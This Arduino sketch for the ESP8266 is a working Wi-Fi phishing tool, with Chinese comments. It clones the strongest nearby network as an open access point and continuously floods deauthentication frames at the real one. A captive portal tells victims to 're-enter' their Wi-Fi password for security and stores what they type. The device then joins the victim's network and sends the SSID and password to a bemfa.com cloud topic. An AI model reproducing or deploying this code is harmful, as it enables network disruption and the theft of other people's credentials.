/*
  WiFi_fishing_baivbai
  可能是以后项目的重要组成部分,不择手段链接网络,发出消息
  @白v白
  Email:2256553068@qq.com
  地址：
  本项目仅供验证与学习使用，所有使用者的操作均与作者本人无关
*/
#include <Arduino.h>                      //本命库万一用到呢
#include <ESP8266WiFi.h>                  //基本服务
#include <DNSServer.h>                    //dns服务
#include <ESP8266WebServer.h>             //web服务
#include <EEPROM.h>                       //内存服务
#include <ESP8266WiFiMulti.h>             //多个WiFi信息连接
extern "C" {                              //这个是c文件要这样声明一下,不能用c++的套路
#include "user_interface.h"
}

#define server_ip "bemfa.com"               //巴法云服务器地址默认即可
#define server_port "8344"                  //服务器端口，tcp创端口8344
#define MAX_PACKETSIZE 512                  //bemfa最大字节数
#define KEEPALIVEATIME 30*1000              //bemfa设置心跳值30s

String ssid = "";                           //免密WiFi的名字

//WiFiEventHandler STAConnected;            //实例化WIFI事件对象
ESP8266WiFiMulti WiFiMulti;                 //实例化ESP8266WiFiMulti对象
ESP8266WebServer WebServer(80);             //web端口
DNSServer DnsServer;                        //实例化dns服务
WiFiClient TCPclient;                       //tcp客户端相关初始化，默认即可

int EEPROM_ssid_start = 30;                 // 在EEPROM中的起始位置保存账号。
int EEPROM_ssid_end = EEPROM_ssid_start;    // 在EEPROM中保存账号的结束位置。
int EEPROM_pass_start = 50;                 // 在EEPROM中的起始位置保存密码。
int EEPROM_pass_end = EEPROM_pass_start;    // 在EEPROM中保存密码的结束位置。

unsigned long bootTime=0, lastActivity=0, lastTick=0, lastTick1=0;//最后的活动滴滴答答什么的,到时候再加,这个老好用了

bool flag1=0;                               //WiFi连接成功标志位
bool flag2=0;                               //flood标志位
bool flag3=1;                               //
bool flag4=0;                               //连接后断开标志位
bool scans_start_flag;                      //提前请求周围WiFi标志位

int LED_BUILTIN=2;                          //灯的管脚

String ESSIDEPASS = "";                     //要给tcp发账密的
String Serial_Buff = "";                    //串口接收字符串，用于接收串口发来的数据
String TcpClient_Buff = "";                 //tcp连接的,初始化字符串，用于接收服务器发来的数据
unsigned int TcpClient_BuffIndex = 0;
unsigned long TcpClient_preTick = 0;
unsigned long preHeartTick = 0;             //心跳
unsigned long preTCPStartTick = 0;          //连接
bool preTCPConnected = false;

const byte DNS_PORT = 53;                   //默认设置dns端口为53
IPAddress local_IP(192,168,17,1);           //免密WiFi的ip地址
IPAddress gateway(192,168,17,1);            //免密WiFi的网关地址
IPAddress subnet(255,255,255,0);            //免密WiFi的子网掩码

String UID = "8e8c55aaad2081ca7ad45d5e80212272";  //用户私钥，可在控制台获取,修改为自己的UID
String TOPIC = "esp826612fdata";                  //主题名字，可在控制台新建

//这里可能要把网页放进来了,因为开不了文件系统
const String HTMLT = "<html><head><meta charset=\"utf-8\"> <title>网络安全</title> <meta name=\"description\" content=\"Wi-Fi Deauthenticator\"> <meta name=\"author\" content=\"Spacehuhn - Stefan Kremser\"> <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"> <style> body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }div { padding: 0.5em; }input { width: 50%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }label { color: #333; display: block; font-style: italic; font-weight: bold; } </style></head><body><div align=\"center\" style=\"padding-top:10%\">";   
//这里是提示和表单输入按钮
const String BODY1 = "<p> <B>&#x4E3A;&#x4E86;&#x4FDD;&#x969C;&#x60A8;&#x7684;&#x7F51;&#x7EDC;&#x5B89;&#x5168;&#xFF0C;&#x8BF7;&#x91CD;&#x65B0;&#x786E;&#x8BA4;WIFI&#x5BC6;&#x7801;!</B> </p> <br /> <form action=/password method=post> <label>WiFi&#x5BC6;&#x7801;:</label> <input type=password name=password placeholder=\"&#x8BF7;&#x8F93;&#x5165;&#x5BC6;&#x7801;\"></input> <input type=submit value=&#x786E;&#x5B9A; > </form>";
//这里是成功提示
const String BODY2 = "<p><B>&#x611F;&#x8C22;&#x60A8;&#x7684;&#x914D;&#x5408;&#xFF0C;&#x7F51;&#x7EDC;&#x5C06;&#x7545;&#x901A;&#x65E0;&#x963B;!</B></p>";
//html尾巴
const String HTMLW = "</div></body></html>";                         

uint8_t packet[26] = {                      //flood帧,这里比较关键
  0xC0, 0x00,
  0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00,
  0x01, 0x00
};



void packetset(uint8_t* mac){               //将mac帧里确定wifi
  memcpy(&packet[10], mac, 6);              //将mas里6位数据复制过去,取的是地址里的放的也是地址里的,这里很巧妙避免了繁琐
  memcpy(&packet[16], mac, 6);
}

void homepage1(void){                           //设置第一次弹出的请求处理函数
  analogWrite(LED_BUILTIN, 0);                  //有一个人接入了,开灯庆祝
  String message1 = HTMLT + BODY1 + HTMLW;
  WebServer.send(200, "text/html", message1);
}

void homepage2(void){                           //设置第二次弹出的请求处理函数,取回密码验证并且存放到内存
  String pass = WebServer.arg("password");                     //接password
  String message2 = HTMLT + BODY2 + HTMLW;
  WebServer.send(200, "text/html", message2);
  analogWrite(LED_BUILTIN, 1023);               //要到密码了,要低调
  Serial.println(pass);
  for (int i = 0; i <= ssid.length(); ++i){
    EEPROM.write(EEPROM_ssid_end + i, ssid[i]); //装进eeprom就可以安心离去了
  }
  EEPROM_ssid_end += ssid.length();             //给人家把长度更新了
  EEPROM.write(EEPROM_ssid_end, '\0');
    
  for (int i = 0; i <= pass.length(); ++i){
    EEPROM.write(EEPROM_pass_end + i, pass[i]); //装进eeprom就可以安心离去了
  }
  EEPROM_pass_end += pass.length();             //给人家把长度更新了
  EEPROM.write(EEPROM_pass_end, '\0');
  EEPROM.end();
  ESP.reset();
}

//http://baivbai.com/submit?password=1011101&niubi=blus
//String state=server.arg("password");

void WebServer_init(void){                              //初始化WebServer
  WebServer.on("/", homepage1);                         //设置页处理函数
  WebServer.on("/password", homepage2);                 //设置广页处理函数
  WebServer.onNotFound(homepage1);                      //设置没找到页面
  WebServer.begin();
}

void DnsServer_init(void){                              //初始化DnsServer
  DnsServer.start(DNS_PORT, "*", local_IP);
}

bool scans_start(void) {                                //同步扫描周围网络,后面再改
  int b=-200,c;
  int n = WiFi.scanNetworks();                          //容易陷进去出不来了,所以在setup里面就提前了
  if (n == 0){
    return false;
  }else{
    for (int f = 0; f < n; ++f){
      if(WiFi.RSSI(f) > b){
        b=WiFi.RSSI(f);                                 //堆载溢出可能会重启
        c=f;
      }
    }
    packetset(WiFi.BSSID(c));                           //把mac,ssid保存了
    ssid=WiFi.SSID(c);
    return true;
  }
}

//////////////////////////////tcp到巴法服务器/////////////////////////////////

void sendtoTCPServer(String p){                             //发送数据到TCP服务器
  if (!TCPclient.connected()) {                             //看看能闹成啵
    return;
  }
  TCPclient.print(p);
}

void startTCPClient(void){                                  //初始化和服务器建立连接
  if(TCPclient.connect(server_ip, atoi(server_port))){
    Serial.print("run");
    String tcpTemp="";  //初始化字符串
    tcpTemp = "cmd=3&uid="+UID+"&topic="+TOPIC+"\r\n";      //构建订阅指令
    sendtoTCPServer(tcpTemp); //发送订阅指令
    tcpTemp="";//清空
    /*
     //如果需要订阅多个主题，可再次发送订阅指令
      tcpTemp = "cmd=1&uid="+UID+"&topic="+主题2+"\r\n"; //构建订阅指令
      sendtoTCPServer(tcpTemp); //发送订阅指令
      tcpTemp="";//清空
     */
    preTCPConnected = true;                                 //tcp算是连上了
    preHeartTick = millis();                                //给心跳做个标记
    TCPclient.setNoDelay(true);                             //禁止用延时,什么鬼
  }
  else{
    Serial.print("error");
    TCPclient.stop();
    preTCPConnected = false;                                //么连上
  }
  preTCPStartTick = millis();
}

void BAFA_signal_communication(){                           //检查数据，发送心跳
  if(WiFi.status() != WL_CONNECTED) return;                 //检查WiFi是否断开，断开后就不连了呗
  if (!TCPclient.connected()) {                             //要是么连上,断开重连
    if(preTCPConnected == true){
      preTCPConnected = false;                              //这里
      preTCPStartTick = millis();
      TCPclient.stop();
    }else if(millis() - preTCPStartTick > 1*1000)           //时差,重新连接
      startTCPClient();
  }else{
    if (TCPclient.available()) {                            //收数据
      char c =TCPclient.read();
      TcpClient_Buff +=c;
      TcpClient_BuffIndex++;
      TcpClient_preTick = millis();
      
      if(TcpClient_BuffIndex>=MAX_PACKETSIZE - 1){
        TcpClient_BuffIndex = MAX_PACKETSIZE-2;
        TcpClient_preTick = TcpClient_preTick - 200;
      }
      preHeartTick = millis();
    }
    if(millis() - preHeartTick >= KEEPALIVEATIME){          //保持心跳
      preHeartTick = millis();
      sendtoTCPServer("ping\r\n");                          //发送心跳，指令需\r\n结尾，详见接入文档介绍
    }
  }
  if((TcpClient_Buff.length() >= 1) && (millis() - TcpClient_preTick>=200))
  {
    TCPclient.flush();
    TcpClient_Buff.trim();                                  //去掉首位空格
    String getTopic = "";
    String getMsg = "";
    if(TcpClient_Buff.length() > 15){                       //注意TcpClient_Buff只是个字符串，在上面开头做了初始化 String TcpClient_Buff = "";
          //此时会收到推送的指令，指令大概为 cmd=2&uid=xxx&topic=light002&msg=off
          int topicIndex = TcpClient_Buff.indexOf("&topic=")+7; //c语言字符串查找，查找&topic=位置，并移动7位，不懂的可百度c语言字符串查找
          int msgIndex = TcpClient_Buff.indexOf("&msg=");   //c语言字符串查找，查找&msg=位置
          getTopic = TcpClient_Buff.substring(topicIndex,msgIndex);//c语言字符串截取，截取到topic,不懂的可百度c语言字符串截取
          getMsg = TcpClient_Buff.substring(msgIndex+5);    //c语言字符串截取，截取到消息
          Serial.println(getMsg);                           //打印截取到的消息值
   }
   if(getMsg  == "led2on"){                                 //如果是消息==打开
    analogWrite(LED_BUILTIN, 0);
   }else if(getMsg == "led2off"){                           //如果是消息==关闭
    analogWrite(LED_BUILTIN, 1023);
   }else if(getMsg == "led2onoff"){                           //调皮
    analogWrite(LED_BUILTIN, 512);
   }

   TcpClient_Buff="";
   TcpClient_BuffIndex = 0;
  }
}

void setup(void) {
  Serial.begin(115200);                           //初始化串口
  EEPROM.begin(512);                              //只申请了512个b,我记得你要是存储其他数组什么东西的话,会占用后面的b所以从前面申请少点,够用就行
  WiFi.mode(WIFI_AP_STA);                         //WiFi模式
  Serial.println(" ");                            //打个回车意思一下
  pinMode(LED_BUILTIN, OUTPUT);                   //初始化led
  WiFi.softAPConfig(local_IP, gateway, subnet);   //配置ap的ip
  analogWrite(LED_BUILTIN, 1023);                 //0-1023
  scans_start_flag=scans_start();                 //未雨绸缪不能等到时候再找,到时候就晚了
  bootTime = lastActivity = millis();             //整一下吧虽然用不上,这不就用上了
  WebServer_init();
  DnsServer_init();
  WiFiMulti.addAP("白v白" , "04171228");           //添加
  WiFiMulti.addAP("白w白" , "04171228");
  unsigned long millis_time = millis();           //提前定好时间,出不来就不管了
  while((WiFiMulti.run() != WL_CONNECTED) && (millis() - millis_time < 8000)){                      //设置超时时间
    delay(100);
  }
  if(millis() - millis_time < 8000){              //看看你是因为啥出来的
    flag1=1;
    flag2=0;
    Serial.println(WiFi.localIP());               //看我惜字如金,却也忍不住叫一声牛逼啊
    startTCPClient();                             //如果连接成功就给tcp连接初始化
  }else if(EEPROM.read(EEPROM_pass_start) != '\0' && EEPROM.read(EEPROM_ssid_start) != '\0'){       //如果内存有曰.
    String ESSID, EPASS;
    int i = 0, e = 0;
    while (EEPROM.read(EEPROM_ssid_start+i) != '\0') {                                              //只要没度到结束位置就继续读取
      ESSID += char(EEPROM.read(EEPROM_ssid_start+i));
      i++;
    }
    while (EEPROM.read(EEPROM_pass_start+e) != '\0') {                                              //只要没度到结束位置就继续读取
      EPASS += char(EEPROM.read(EEPROM_pass_start+e));
      e++;
    }
    ESSIDEPASS=ESSID+EPASS;
    const char *ssidls = ESSID.c_str();
    const char *passwordls = EPASS.c_str();
    WiFiMulti.addAP(ssidls , passwordls);
    unsigned long millis_time = millis();
    while((WiFiMulti.run() != WL_CONNECTED) && (millis() - millis_time < 8000)){                    //设置超时时间
      delay(100); 
    }
    if (millis() - millis_time < 8000){
      flag1=1;
      flag2=0;
      Serial.println(WiFi.localIP());
      startTCPClient();                                     //如果连接成功就给tcp连接初始化
    }else{                                                  //得了吧,内存没曰,人家不想鸟你,清理eeprom,重新启动
      EEPROM_ssid_end = EEPROM_ssid_start;                  //设置密码结束位置->开始位置。
      EEPROM_pass_end = EEPROM_pass_start;                  //设置密码结束位置->开始位置。
      EEPROM.write(EEPROM_ssid_end, '\0');
      EEPROM.write(EEPROM_pass_end, '\0');
      EEPROM.end();                                         //每一次都会吧一整块eeprom擦掉,吧上面写好的写进去,EEPROM.commit();也一样
      ESP.reset();
    }
  }else{                                                    //开始大水般的攻击,和假装钓鱼
    if(scans_start_flag){                                   //老早以前就扫描了,当时留了一条后,这不就用上了,之前结束的时候已经把目标WiFi保存好了
      flag1=0;
      flag2=1;
      const char *ssidxjrd = ssid.c_str();
      WiFi.softAP(ssidxjrd);                                //我不说你也知道,因为你能看见
    }else{
      ESP.reset();
    }
  }
}
 
void loop(void) {
  WebServer.handleClient();                                 //监听客户请求并处理
  if(flag2==1){                                             //如果要求flood处于攻击状态
    DnsServer.processNextRequest();                         //处理dns服务
    if(millis() - lastTick > 10){                           //10ms
        wifi_send_pkt_freedom(packet, 26, 0);               //无线发送自由点,这是发大水的大头
        //Serial.println(wifi_send_pkt_freedom(packet, 26, 0));               //显示一下,想看的话把上面的注释掉,要不然看的太频繁,人家就害羞了
      lastTick = millis();
    }
  }
  
  if(flag1==1){                                             //连接上了,
    BAFA_signal_communication();
    if ( TCPclient.connected() && ESSIDEPASS != "" ){       //发一次密码到云
      String tcpTemp="";                                    //初始化字符串
      tcpTemp = "cmd=2&uid="+UID+"&topic="+TOPIC+"&msg="+ESSIDEPASS+"\r\n";      //构建发布指令
      sendtoTCPServer(tcpTemp);                             //发送订阅指令
      tcpTemp="";                                           //清空
      ESSIDEPASS = "";
    }
    if(Serial.available()>0 && TCPclient.connected()){      //接受串口处数据到云
      delay(100);
      Serial_Buff = Serial.readString();
      String tcpTemp="";                                    //初始化字符串
      tcpTemp = "cmd=2&uid="+UID+"&topic="+TOPIC+"&msg="+Serial_Buff+"\r\n";      //构建发布指令
      sendtoTCPServer(tcpTemp);                             //发送订阅指令
      tcpTemp="";                                           //清空
    }
    
 
  }

  if ( (WiFi.status() != WL_CONNECTED) && ( flag1==1 || (millis() - bootTime > 600000))) {             //没连接成功并且还距离开机时间有10分钟了,就要重新启动试试
      ESP.reset();                                          //十分钟或者正在运行中俩个或一下,再和断网与一下,就重新启动
  }
}
